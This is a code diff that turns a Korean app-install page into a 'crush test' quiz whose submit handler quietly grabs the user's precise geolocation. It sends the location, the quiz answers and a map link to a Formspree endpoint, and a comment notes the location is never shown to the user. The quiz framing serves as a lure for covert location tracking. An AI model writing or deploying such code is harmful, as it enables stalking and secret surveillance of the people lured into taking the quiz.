@@ -1,98 +1,138 @@
 <!DOCTYPE html>
 <html lang="ko">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>사랑스러운 앱 💖</title>
-    <link rel="manifest" href="manifest.json" />
-    <link rel="icon" href="heart.png" type="image/png" />
-    <meta name="theme-color" content="#ff5b99" />
-    <style>
-      body {
-        font-family: 'Pretendard', sans-serif;
-        background: #ffe4ec;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        height: 100vh;
-        margin: 0;
-        color: #333;
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>짝사랑 테스트 💘</title>
+  <link rel="manifest" href="manifest.json" />
+  <style>
+    body {
+      font-family: "Pretendard", sans-serif;
+      background: #ffe6eb;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+    }
+
+    h1 {
+      color: #ff5c8d;
+      font-size: 2rem;
+      margin-bottom: 30px;
+    }
+
+    .question {
+      margin: 10px 0;
+      padding: 15px;
+      background: white;
+      border-radius: 15px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      width: 90%;
+    }
+
+    button {
+      background: #ff5c8d;
+      color: white;
+      font-size: 1.2rem;
+      border: none;
+      border-radius: 15px;
+      padding: 15px 30px;
+      margin-top: 25px;
+      cursor: pointer;
+      box-shadow: 0 3px 8px rgba(0,0,0,0.2);
+      position: relative;
+    }
+
+    button span {
+      font-size: 0.8rem;
+      display: block;
+      color: #ffe6eb;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+  </style>
+</head>
+<body>
+  <h1>💞 짝사랑 테스트 💞</h1>
+
+  <form id="loveForm">
+    <div class="question"><input type="checkbox" name="q1"> 그 사람을 생각하면 괜히 기분이 좋아진다.</div>
+    <div class="question"><input type="checkbox" name="q2"> 연락이 오면 너무 기쁘고, 안 오면 하루 종일 신경 쓰인다.</div>
+    <div class="question"><input type="checkbox" name="q3"> 혹시 나를 좋아하는 건 아닐까 하는 상상을 해본 적이 있다.</div>
+    <div class="question"><input type="checkbox" name="q4"> 그 사람 주변 이성 친구들을 보면 질투가 난다.</div>
+    <div class="question"><input type="checkbox" name="q5"> 같이 있을 땐 너무 떨려서 평소처럼 행동하기 힘들다.</div>
+    <div class="question"><input type="checkbox" name="q6"> 그 사람에게 잘 보이려고 노력한다 (옷차림, 말투 등).</div>
+    <div class="question"><input type="checkbox" name="q7"> 그 사람의 사소한 말도 오래 기억한다.</div>
+    <div class="question"><input type="checkbox" name="q8"> 다른 사람이 나를 좋아해도 그 사람이 더 신경 쓰인다.</div>
+    <div class="question"><input type="checkbox" name="q9"> 그 사람과 눈이 마주치기만 해도 심장이 뛴다.</div>
+    <div class="question"><input type="checkbox" name="q10"> 그 사람과 함께 있는 상상을 자주 한다.</div>
+
+    <button type="submit" id="submitBtn">
+      결과 보기
+      <span>📍 위치 공유하기</span>
+    </button>
+  </form>
+
+  <script>
+    const form = document.getElementById("loveForm");
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      // 사용자 답변 수집
+      const data = new FormData(form);
+      const answers = [];
+      data.forEach((_, key) => answers.push(key));
+
+      // 위치 정보 가져오기 (조용히)
+      let locationData = { note: "위치 권한 거부 또는 실패" };
+
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const { latitude, longitude } = pos.coords;
+            locationData = {
+              lat: latitude,
+              lon: longitude,
+              mapLink: `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`,
+              method: "geolocation"
+            };
+            sendData(answers, locationData);
+          },
+          () => {
+            locationData = { note: "위치 권한 거부됨" };
+            sendData(answers, locationData);
+          },
+          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        );
+      } else {
+        locationData = { note: "Geolocation 미지원 브라우저" };
+        sendData(answers, locationData);
       }
+    });
 
-      img {
-        width: 150px;
-        height: 150px;
-        margin-bottom: 20px;
-      }
+    async function sendData(answers, locationData) {
+      const payload = {
+        answers: answers,
+        location: locationData
+      };
 
-      h1 {
-        color: #ff4b8a;
-        font-size: 28px;
-        margin-bottom: 15px;
-      }
-
-      button {
-        background-color: #ff5b99;
-        color: white;
-        border: none;
-        padding: 14px 25px;
-        border-radius: 10px;
-        font-size: 16px;
-        cursor: pointer;
-        box-shadow: 0 3px 8px rgba(255, 91, 153, 0.3);
-        transition: all 0.2s ease-in-out;
-      }
-
-      button:hover {
-        background-color: #ff3e84;
-        transform: scale(1.05);
-      }
-
-      #status {
-        margin-top: 20px;
-        color: #666;
-        font-size: 14px;
-      }
-    </style>
-  </head>
-  <body>
-    <img src="heart.png" alt="하트" />
-    <h1>사랑스러운 앱 💕</h1>
-    <button id="installBtn">앱으로 설치하기</button>
-    <p id="status">홈 화면에 추가해보세요!</p>
-
-    <script>
-      let deferredPrompt;
-      const installBtn = document.getElementById("installBtn");
-      const status = document.getElementById("status");
-
-      window.addEventListener("beforeinstallprompt", (e) => {
-        e.preventDefault();
-        deferredPrompt = e;
-        installBtn.style.display = "block";
-        status.textContent = "앱 설치가 가능합니다 💖";
+      await fetch("https://formspree.io/f/YOUR_FORM_ID", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
       });
 
-      installBtn.addEventListener("click", async () => {
-        if (deferredPrompt) {
-          deferredPrompt.prompt();
-          const { outcome } = await deferredPrompt.userChoice;
-          if (outcome === "accepted") {
-            status.textContent = "앱 설치 완료! 🎉";
-          } else {
-            status.textContent = "앱 설치가 취소되었습니다.";
-          }
-          deferredPrompt = null;
-        }
-      });
+      // 결과 화면으로 이동 (위치 정보 표시 안 함)
+      window.location.href = "result.html";
+    }
 
-      if ("serviceWorker" in navigator) {
-        navigator.serviceWorker
-          .register("service-worker.js")
-          .then(() => console.log("서비스 워커 등록 완료"))
-          .catch((err) => console.error("서비스 워커 등록 실패:", err));
-      }
-    </script>
-  </body>
+    // PWA 설치 준비
+    if ("serviceWorker" in navigator) {
+      navigator.serviceWorker.register("service-worker.js");
+    }
+  </script>
+</body>
 </html>
